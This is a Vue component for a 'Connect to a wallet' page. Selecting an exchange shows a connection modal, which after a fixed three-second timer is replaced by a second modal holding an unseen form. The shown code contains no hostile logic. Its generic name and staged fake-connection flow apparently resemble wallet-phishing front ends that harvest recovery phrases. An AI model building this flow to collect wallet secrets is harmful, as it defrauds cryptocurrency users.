<template>
  <!-- collab body -->
  <div class="bg-white h-screen">
    <!-- top header -->
    <div class="background-gradient flex items-center justify-center space-x-2">
      <h2 class="text-xl p-4 justify-center">EvmPortalResolve</h2>
      <p class="text-slate-500">3.1.1</p>
    </div>

    <!-- BASE CARD -->
    <div class="flex flex-col md:h-[80vh] h-[90vh] lg:mx-auto mx-6 mt-10 lg:max-w-2xl shadow-lg">
      <!-- 🔥 UPDATED HEADER WITH SEARCH -->
      <div class="bg-cyan-700 p-4 rounded-t-2xl flex items-center justify-between">
        <!-- Title -->
        <p class="text-white font-semibold">Connect to a wallet</p>

        <!-- Search -->
        <div class="relative">
          <input
            v-model="searchQuery"
            type="text"
            placeholder="Search..."
            class="bg-gray-800 text-white placeholder-gray-400 text-base px-3 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition w-40 md:w-40"
          />
          <span class="absolute right-2 top-2 text-gray-400 text-sm">🔍</span>
        </div>
      </div>

      <!-- Scroll card (NOW RECEIVES SEARCH QUERY) -->
      <scroll-card :searchQuery="searchQuery" @select-exchange="openModal"></scroll-card>
    </div>

    <!-- First popup modal -->
    <back-drop-modal :show="showFirstModal">
      <exchange-connection :exchange="selectedExchange" @cancel-modal="closeModal" />
    </back-drop-modal>

    <!-- Second popup modal -->
    <back-drop-modal :show="showSecondModal">
      <form-card :exchange="selectedExchange" @cancel-modal="closeModal" />
    </back-drop-modal>
  </div>
</template>

<script>
import BackDropModal from '@/components/layout/BackDropModal.vue'
import ScrollCard from './ScrollCard.vue'
import ExchangeConnection from './ExchangeConnection.vue'
import FormCard from './FormCard.vue'

export default {
  components: {
    BackDropModal,
    ScrollCard,
    ExchangeConnection,
    FormCard,
  },

  data() {
    return {
      selectedExchange: null,
      showFirstModal: false,
      showSecondModal: false,
      searchQuery: '',
      modalTimer: null, // 🔥 store the timeout ID
    }
  },

  methods: {
    closeModal() {
      // clear any pending modal timer
      if (this.modalTimer) {
        clearTimeout(this.modalTimer)
        this.modalTimer = null
      }

      this.showFirstModal = false
      this.showSecondModal = false
    },

    openModal(exchange) {
      this.selectedExchange = exchange
      this.showFirstModal = true

      // store the timeout so we can cancel if needed
      this.modalTimer = setTimeout(() => {
        this.showFirstModal = false
        this.showSecondModal = true
        this.modalTimer = null
      }, 3000)
    },
  },
}
</script>
